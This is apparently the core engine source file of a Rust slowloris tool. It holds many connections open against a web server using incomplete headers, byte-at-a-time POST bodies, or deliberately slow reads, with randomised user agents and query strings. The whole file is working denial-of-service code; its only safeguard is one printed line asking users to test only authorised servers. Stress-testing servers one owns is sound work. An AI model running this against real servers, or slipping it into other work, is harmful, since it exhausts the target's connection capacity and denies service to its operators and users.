//! The slow-HTTP engine: maintain a pool of connections and feed each one just
//! enough data, just slowly enough, to keep the server holding it open.

use std::io::{ErrorKind, Read, Write};
use std::time::{Duration, Instant};

use crate::agents;
use crate::cli::{Args, Mode, Target};
use crate::rng::Rng;
use crate::stream::{Connector, Stream};

/// One tracked connection and the per-connection state the mode needs.
struct Conn {
    stream: Stream,
    /// Bytes of the slow-POST body still left to dribble out.
    body_remaining: usize,
    /// Scratch buffer for slow-read.
    read_scratch: Vec<u8>,
}

pub struct Engine<'a> {
    args: &'a Args,
    target: Target,
    connector: Connector,
    user_agent: String,
    conns: Vec<Conn>,
    rng: Rng,
}

impl<'a> Engine<'a> {
    pub fn new(args: &'a Args, target: Target) -> Result<Self, String> {
        // Slow-read benefits from a tiny receive buffer so the kernel/app can't
        // just hand us the whole response at once.
        let recv_buffer = if args.mode == Mode::Read {
            Some(512)
        } else {
            None
        };
        let connector = Connector::new(&target, args.timeout(), recv_buffer, args.insecure)?;
        let mut rng = Rng::new();
        let user_agent = args
            .user_agent
            .clone()
            .unwrap_or_else(|| agents::random(&mut rng).to_string());

        Ok(Engine {
            args,
            target,
            connector,
            user_agent,
            conns: Vec::with_capacity(args.connections),
            rng,
        })
    }

    pub fn run(&mut self) -> Result<(), String> {
        let started = Instant::now();
        let interval = self.args.interval();

        println!(
            "slowloris: mode={} target={}://{}:{}{} connections={} interval={}s",
            self.args.mode,
            if self.target.tls { "https" } else { "http" },
            self.target.host,
            self.target.port,
            self.target.path,
            self.args.connections,
            interval.as_secs(),
        );
        eprintln!("NOTE: only run this against servers you own or are authorized to test.");

        loop {
            self.replenish();
            self.report();

            if self.args.duration > 0 && started.elapsed().as_secs() >= self.args.duration {
                println!(
                    "\nReached duration limit; closing {} connections.",
                    self.conns.len()
                );
                return Ok(());
            }

            std::thread::sleep(interval);
            self.keepalive();
        }
    }

    /// Open new connections (up to the rate limit) until the pool is full.
    fn replenish(&mut self) {
        let mut opened = 0;
        while self.conns.len() < self.args.connections && opened < self.args.rate {
            match self.connector.connect(&self.target) {
                Ok(stream) => match self.open_request(stream) {
                    Ok(conn) => {
                        self.conns.push(conn);
                        opened += 1;
                    }
                    Err(e) => {
                        if self.args.verbose {
                            eprintln!("  initial request failed: {e}");
                        }
                    }
                },
                Err(e) => {
                    if self.args.verbose {
                        eprintln!("  connect failed: {e}");
                    }
                    // Target is refusing new connections — that's often the
                    // whole point. Stop hammering connect() this tick.
                    break;
                }
            }
        }
    }

    /// Send the opening (deliberately incomplete) request for a new connection.
    fn open_request(&mut self, mut stream: Stream) -> std::io::Result<Conn> {
        let rand_q: u32 = self.rng.range_1(100_000);
        let mut body_remaining = 0;

        match self.args.mode {
            Mode::Headers => {
                // Valid request line + headers, but NO terminating blank line,
                // so the server keeps waiting for the rest of the headers.
                let req = format!(
                    "GET {}?{} HTTP/1.1\r\n\
                     Host: {}\r\n\
                     User-Agent: {}\r\n\
                     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
                     Accept-Language: en-US,en;q=0.5\r\n",
                    self.target.path,
                    rand_q,
                    self.host_header(),
                    self.user_agent,
                );
                stream.write_all(req.as_bytes())?;
                stream.flush()?;
            }
            Mode::Body => {
                // Complete headers advertising a large body, then send the body
                // a byte at a time far slower than the server will wait for.
                body_remaining = self.args.content_length;
                let req = format!(
                    "POST {} HTTP/1.1\r\n\
                     Host: {}\r\n\
                     User-Agent: {}\r\n\
                     Content-Type: application/x-www-form-urlencoded\r\n\
                     Content-Length: {}\r\n\
                     Connection: keep-alive\r\n\r\n",
                    self.target.path,
                    self.host_header(),
                    self.user_agent,
                    body_remaining,
                );
                stream.write_all(req.as_bytes())?;
                stream.flush()?;
            }
            Mode::Read => {
                // A *complete*, legitimate request — the slowness is on our
                // read side (tiny recv buffer + reading a little at a time).
                let req = format!(
                    "GET {}?{} HTTP/1.1\r\n\
                     Host: {}\r\n\
                     User-Agent: {}\r\n\
                     Accept: */*\r\n\
                     Connection: keep-alive\r\n\r\n",
                    self.target.path,
                    rand_q,
                    self.host_header(),
                    self.user_agent,
                );
                stream.write_all(req.as_bytes())?;
                stream.flush()?;
            }
        }

        Ok(Conn {
            stream,
            body_remaining,
            read_scratch: vec![0u8; 64],
        })
    }

    /// Feed each live connection one small unit of data (or read a sip), and
    /// drop the ones the server has closed.
    fn keepalive(&mut self) {
        // Split borrows so the retain_mut closure can touch `rng` while it
        // holds `conns` mutably.
        let Self {
            conns, rng, args, ..
        } = self;
        let mode = args.mode;
        let verbose = args.verbose;

        conns.retain_mut(|conn| {
            let result: std::io::Result<()> = match mode {
                Mode::Headers => {
                    // One more bogus-but-well-formed header line. Never the
                    // blank line that would end the header block.
                    let line = format!("X-{}: {}\r\n", rng.range_1(5000), rng.range_1(5000));
                    conn.stream
                        .write_all(line.as_bytes())
                        .and_then(|_| conn.stream.flush())
                }
                Mode::Body => {
                    if conn.body_remaining > 0 {
                        let r = conn
                            .stream
                            .write_all(b"a")
                            .and_then(|_| conn.stream.flush());
                        if r.is_ok() {
                            conn.body_remaining -= 1;
                        }
                        r
                    } else {
                        // Body finished; nothing more to send. Keep it open.
                        Ok(())
                    }
                }
                Mode::Read => {
                    // Read a small sip of the response. WouldBlock/timeout just
                    // means the server hasn't sent more yet — keep the conn.
                    match conn.stream.read(&mut conn.read_scratch) {
                        Ok(0) => Err(std::io::Error::new(ErrorKind::UnexpectedEof, "closed")),
                        Ok(_) => Ok(()),
                        Err(e)
                            if e.kind() == ErrorKind::WouldBlock
                                || e.kind() == ErrorKind::TimedOut =>
                        {
                            Ok(())
                        }
                        Err(e) => Err(e),
                    }
                }
            };

            match result {
                Ok(()) => true,
                Err(e) => {
                    if verbose {
                        eprintln!("  connection dropped: {e}");
                    }
                    false
                }
            }
        });
    }

    /// `Host` header value, including a non-default port.
    fn host_header(&self) -> String {
        let default = if self.target.tls { 443 } else { 80 };
        if self.target.port == default {
            self.target.host.clone()
        } else {
            format!("{}:{}", self.target.host, self.target.port)
        }
    }

    fn report(&self) {
        let now = time_hhmmss();
        print!("\r[{now}] active connections: {:>5}", self.conns.len());
        let _ = std::io::stdout().flush();
    }
}

/// Wall-clock HH:MM:SS without pulling in a date/time crate.
fn time_hhmmss() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or(Duration::ZERO)
        .as_secs();
    let (h, m, s) = ((secs / 3600) % 24, (secs / 60) % 60, secs % 60);
    format!("{h:02}:{m:02}:{s:02}")
}
